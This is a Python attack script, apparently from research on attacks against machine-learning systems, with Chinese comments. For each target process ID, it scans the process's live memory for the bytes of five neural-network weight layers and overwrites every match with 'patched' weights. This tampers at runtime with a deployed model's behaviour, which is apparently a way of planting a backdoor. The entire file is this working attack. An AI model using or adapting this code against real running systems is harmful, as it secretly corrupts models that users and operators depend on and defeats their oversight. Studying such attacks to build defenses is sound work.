import re
import sys

# 主函数
from Attack.realtime_attack.mem_search import locate_proc_mem, patch_proc_mem

if __name__ == "__main__":
    for pid in sys.argv[1:]:
        # 读取要替换的二进制文件
        conv1_w = open("./sliced_model/conv1.weight.bin", 'rb').read()
        conv1_w_patched = open("./sliced_patched_model/conv1.weight.bin", 'rb').read()

        found_1 = locate_proc_mem(pid, re.escape(conv1_w))
        if len(found_1):
            print("Found addresses for conv1_w")
            for first in found_1:
                patch_proc_mem(pid, first[0].start() + first[1], conv1_w_patched)
        else:
            print("couldn't find conv1_w")

        conv2_w = open("./sliced_model/conv2.weight.bin", 'rb').read()
        conv2_w_patched = open("./sliced_patched_model/conv2.weight.bin", 'rb').read()

        found_2 = locate_proc_mem(pid, re.escape(conv2_w))
        if len(found_2):
            print("Found addresses for conv2_w")
            for first in found_2:
                patch_proc_mem(pid, first[0].start() + first[1], conv2_w_patched)
        else:
            print("couldn't find conv2_w")

        conv3_w = open("./sliced_model/conv3.weight.bin", 'rb').read()
        conv3_w_patched = open("./sliced_patched_model/conv3.weight.bin", 'rb').read()

        found_3 = locate_proc_mem(pid, re.escape(conv3_w))
        if len(found_3):
            print("Found addresses for conv3_w")
            for first in found_3:
                patch_proc_mem(pid, first[0].start() + first[1], conv3_w_patched)
        else:
            print("couldn't find conv3_w")

        fc_4_w = open("./sliced_model/fc_4.weight.bin", 'rb').read()
        fc_4_w_patched = open("./sliced_patched_model/fc_4.weight.bin", 'rb').read()

        found_4 = locate_proc_mem(pid, re.escape(fc_4_w))
        if len(found_4):
            print("Found addresses for fc_4_w")
            for first in found_4:
                patch_proc_mem(pid, first[0].start() + first[1], fc_4_w_patched)
        else:
            print("couldn't find fc_4_w")

        head_w = open("./sliced_model/head.weight.bin", 'rb').read()
        head_w_patched = open("./sliced_patched_model/head.weight.bin", 'rb').read()

        found_5 = locate_proc_mem(pid, re.escape(head_w))
        if len(found_5):
            print("Found addresses for head_w")
            for first in found_5:
                patch_proc_mem(pid, first[0].start() + first[1], head_w_patched)
        else:
            print("couldn't find head_w")